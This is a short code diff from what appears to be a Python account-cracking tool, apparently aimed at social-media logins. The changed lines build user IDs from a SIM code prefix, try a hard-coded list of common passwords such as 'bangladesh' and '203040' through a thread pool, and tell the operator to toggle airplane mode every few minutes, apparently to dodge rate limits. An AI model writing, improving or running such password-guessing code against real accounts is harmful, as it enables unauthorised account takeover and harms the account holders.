@@ -238,10 +238,10 @@ def i():
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
         print('\033[38;5;46--------------------------------------------')
-        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
+        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97m 2/5MIN ⪼ \033[1;34m⧼\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m⧽ \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','203040','121234','708090','Bangladesh','0987654']
+            pwx = [love,'bangladesh','203040','121234','708090','0987654']
             uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
